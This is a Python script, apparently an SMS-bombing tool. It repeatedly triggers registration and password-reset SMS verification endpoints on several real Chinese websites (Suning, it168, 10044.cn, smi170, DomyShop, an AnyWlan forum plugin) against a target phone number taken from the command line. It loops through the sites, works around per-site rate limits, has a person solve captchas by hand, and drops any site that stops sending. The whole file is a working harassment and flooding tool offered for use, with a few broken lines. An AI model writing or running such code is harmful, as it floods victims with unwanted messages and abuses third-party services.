# -*- coding: utf-8 -*-
#!/usr/bin/python

import http.cookiejar
import urllib
import urllib.request
import urllib.parse
import re
import sys
import time
import os
import json
import random

class bcolors:
    HEADER = '\033[95m'           # 粉色
    OKBLUE = '\033[94m'           # 蓝色
    OKGREEN = '\033[92m'          # 绿色
    WARNING = '\033[93m'          # 黄色
    FAIL = '\033[91m'             # 红色
    BOLD = '\033[1m'              # 粗体
    ENDC = '\033[0m'              # 结束

if sys.version.find('3') == 0:
    import urllib.request
    urlrequest = urllib.request
    urlparse = urllib.parse
else:
    import urllib2
    urlrequest = urllib2
    urlparse = urllib

def detectEncoding(res):
    header = res.getheader('Content-Type').lower()
    return header[header.find('charset=') + len('charset='):]

def decodeAndPrint(res):
    failed = True
    encode = detectEncoding(res)
    b = res.read()
    try:
        #print('try original:'+ encode)
        u = b.decode(encode, 'ignore')
        failed = False
    except Exception as e:
        print(e)    

    if failed == True:    
        try:
            print('original %s failed, try utf8'% encode)
            u = b.decode('utf8')
            failed = False
        except Exception as e:
            print(e)

    if failed == True:
        try:
            print('try gbk')
            u = b.decode('gbk')
            failed = False
        except Exception as e:
            print(e)

    if failed == True:
        try:
            print('try utf8 ignore')
            u = b.decode('utf8', 'ignore')
            failed = False
        except Exception as e:
            print(e)

    
    if failed == True:
        try:
            print('try gbk ignore')
            u = b.decode('gbk', 'ignore')
            failed = False
        except Exception as e:
            print(e)
            return

    try:
        ppu = u.encode('gbk', 'ignore')
        print(ppu)
    except Exception as e:
        print(e)
        
    return u

class blast:
    def __init__(self, opener):
        self.valid = True
        self.callTime = 0
        self.limit = False
        self.interval = 60
        self.opener = opener
        self.current = sys.path[0] + '/' + self.__class__.__name__ + '/'

    def displayImage(self, path):
        path = self.current + path
        if os.name == 'nt':
            os.system('start ' + path)
        else:
            os.system('display ' + path)

    def write(self, b, fileName):
        path = self.current
        if os.path.exists(path) == False:
            os.mkdir(path)
        f = open(path + fileName, 'wb')
        f.write(b)
        f.flush()
        f.close()

    def download(self, url, fileName):
        b = self.opener.open(url).read()
        self.write(b, fileName)

    def beforeExplosion(self):
        if self.valid == False:
            print(bcolors.FAIL + '==>>> %s <<<== is invalid!' + bcolors.END % self.__class__.__name__)
            return False
        now = time.time()
        if now - self.callTime > self.interval:
            self.callTime = now
            return True
        else:
            return False

    def inputFromImage(self, url):
        self.download(url, 'vc.jpg')
        self.displayImage('vc.jpg')
        return input('Please input the verify code :')

    def explode():
        print('abstract method called!')
        

class AnyWlan(blast):
    def __init__(self, opener, phone):
        blast.__init__(self, opener)
        self.url = 'http://forum.anywlan.com/plugin.php?id=comiis_sms&action=register&comiis_tel=%s&secanswer=undefined&secqaahash=undefined&seccodeverify=undefined&seccodehash=undefined&seccodemodid=undefined&inajax=1' % (phone)

    def explode(self):
        if self.beforeExplosion() != True:
            return (False, True)
        
        #data = self.opener.open(self.url).read().decode('gbk')
        #print('data=' + data)
        decodeAndPrint(self.opener.open(self.url))
        return (True, True)
        

class l0044(blast):
    def __init__(self, opener, phone):
        blast.__init__(self, opener)
        verifyCodeUrl = "https://yht.10044.cn/sso/VerifyCode/verifyCodeImage?time=" + str((int)(time.time()))
        self.download(verifyCodeUrl, 'vc.jpg')
        self.displayImage('vc.jpg')
        vc = input('Please input the verify code :')
        self.url = 'https://yht.10044.cn/sso/VerifyCode/findPwdSendPhoneVerifiedCode?phones=' + phone + '&code_message=' + vc + '&appId='

    def explode(self):
        if self.beforeExplosion() != True:
            return (False, True)
        
        #data = self.opener.open(self.url).read().decode('utf8')
        #print('data=' + data)
        decodeAndPrint(self.opener.open(self.url))
        return (True, True)

class DomyShop(blast):
    def __init__(self, opener, phone):
        blast.__init__(self, opener)
        url = 'http://www.domyshop.com/Home/User/getMobileCode.html'
        self.interval = 80
        self.limit = True
        #self.times = 4

        d = {
            'mobile' : phone,
        }
        data = urlparse.urlencode(d).encode(encoding='UTF8')
        self.req = urlrequest.Request(url, data)

    def explode(self):
        if self.valid != True or self.beforeExplosion() != True:
            return (False, self.valid)
        
        #data = self.opener.open(self.req).read().decode('utf8')
        #print('data=' + data)
        data = decodeAndePrint(self.opener.open(self.url))
        r = json.loads(data)
        self.valid = r['status'] == 'true'
        
        return (True, self.valid)

class Suning(blast):
    def __init__(self, opener, phone):
        blast.__init__(self, opener)        
        url = 'https://reg.suning.com/srs-web/ajax/code/sms.do'
        d = {
            'scen' : 'PERSON_MOBILE_REG_VERIFY_MOBILE',
            'phoneNum' : phone,
            'uid' : '',
            'code' : '',
        }

        h = {
            'User-Agent' : 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0',
            'Refer' : 'https://reg.suning.com/person.do',
        }
        # for cookie:
        self.opener.open('https://reg.suning.com/person.do').read()
        
        data = urlparse.urlencode(d).encode(encoding='UTF8')
        self.req = urlrequest.Request(url, data, h)

    def explode(self):
        if self.valid != True or self.beforeExplosion() != True:
            return (False, self.valid)

        res = self.opener.open(self.req)
        self.write(res.read(), 'a.html')
        data = decodeAndPrint(res)
        #r = json.loads(data)
        beg = data.find('"returnCode":"') + len('"returnCode":"')        
        rc = data[beg : beg + data.find('"', beg)]
        self.valid = rc == 'R0000'
        
        return (True, self.valid)

class Smi170(blast):
    def __init__(self, opener, phone):
        blast.__init__(self, opener)
        self.limit = True
        self.interval = 0
        url = 'http://www.smi170.com/getConfirmKey.html'
        vc = self.inputFromImage('http://www.smi170.com/login!randomImg.do?d=' + str(int(time.time())))
        d = {
            'user.userAccount.' : phone,
            'randomImg' : vc,
        }
        data = urlparse.urlencode(d).encode(encoding='UTF8')
        self.req = urlrequest.Request(url, data)

    def explode(self):
        if self.valid != True or self.beforeExplosion() != True:
            return (False, self.valid)
        
        #data = self.opener.open(self.req).read().decode('utf8')
        #print('data=' + data)
        data = decodeAndPrint(self.opener.open(self.req))
        r = json.loads(data)
        self.valid = r['msg'].find(u'每小时发送短信条数超过限制') == -1
        #self.valid = True
        return (True, self.valid)

class It168(blast):
    def __init__(self, opener, phone):
        blast.__init__(self, opener)
        self.interval = 60
        self.limit = True
        self.count = 3
        vc = self.inputFromImage('http://u.it168.com/site/verifyCode1/random/' + str(random.random()))
        url = 'http://u.it168.com/site/checkVerifyCode/'
        d = {
            'code' : vc,
            'phone' : phone,
        }

        h = {
            'User-Agent' : 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0',
            'Refer' : 'http://u.it168.com/Register',
        }
        #for cookie
        #self.opener.open('http://u.it168.com/Register').read()
        
        data = urlparse.urlencode(d).encode(encoding='UTF8')                         
        self.req = urlrequest.Request(url, data, h)

    def explode(self):
        if self.valid != True or self.beforeExplosion() != True:
            return (False, self.valid)
        
        data = decodeAndPrint(self.opener.open(self.req))
        r = json.loads(data)
        self.valid = r['flag'] != '-3'  # 1 is number
        #self.valid = True
        return (True, self.valid)

def boomStorm(phone, times):
    times = int(times)
    if times <= 0:
        print("times <= 0!")
        return
    
    cookieJar = http.cookiejar.CookieJar()
    handler = urlrequest.HTTPCookieProcessor(cookieJar)
    opener = urlrequest.build_opener(handler)
    
    boom = [
        It168(opener, phone),
#        Suning(opener, phone),
#        AnyWlan(opener, phone),
#        Smi170(opener, phone),
#        l0044(opener, phone),
#        DomyShop(opener, phone),
    ]

    while times >= 0:
        for bullet in boom:
            try:
                called, valid = bullet.explode()
            except Exception as e:
                print(e)
            if valid == False:
                print('=======> remove '+ bullet.__class__.__name__)
                boom.remove(bullet)
                continue
            if called == True and valid == True:
                times -= 1

            time.sleep(1)
            print('One second passed...')

        if len(boom) == 0:
            break


def boomFromAnyWlan(phone):
    url = 'http://forum.anywlan.com/plugin.php?id=comiis_sms&action=register&comiis_tel=%s&secanswer=undefined&secqaahash=undefined&seccodeverify=undefined&seccodehash=undefined&seccodemodid=undefined&inajax=1' % (phone)
    return url

def boomFrom10044Entry(phone, opener):
    verifyCodeUrl = "https://yht.10044.cn/sso/VerifyCode/verifyCodeImage?time=" + str((int)(time.time()))
    print(verifyCodeUrl)

    vcd = opener.open(verifyCodeUrl).read()

    filePath = sys.path[0] + "/verify.jpg"
    print("file:" + filePath);
    f = open(filePath, 'wb')
    f.write(vcd)
    f.close()
    del f

    if os.name == 'nt':
        os.system('start ' + filePath)
    else:
        os.system('display ' + filePath)
    
    vc = input('Please input the verify code (' + filePath + '):')
    return 'https://yht.10044.cn/sso/VerifyCode/findPwdSendPhoneVerifiedCode?phones=' + phone + '&code_message=' + vc + '&appId='
    

def boomSeason(phone, times):
    times = int(times)
    if times <= 0:
        print("times <= 0!")
        return
    
    cookieJar = http.cookiejar.CookieJar()
    handler = urllib.request.HTTPCookieProcessor(cookieJar)
    opener = urllib.request.build_opener(handler)
    
    boom = []
    # 10044
    boom.append(boomFrom10044Entry(phone, opener))
    # AnyWlan
    boom.append(boomFromAnyWlan(phone))

    interval = 60.0 / len(boom)
    while times >= 0:
        for bullet in boom:
            try:
                data = opener.open(bullet).read().decode('utf8')
            except Exception as e:
                print(e)
            print('data=' + data)
            time.sleep(interval)
            times -= 1

            print('times=' + str(times))
        #time.sleep(60)
        #times -= 1

if __name__ == '__main__':
    print('phone=' + sys.argv[1] + ', times=' + sys.argv[2])
    #boomSeason(sys.argv[1], sys.argv[2])
    boomStorm(sys.argv[1], sys.argv[2])

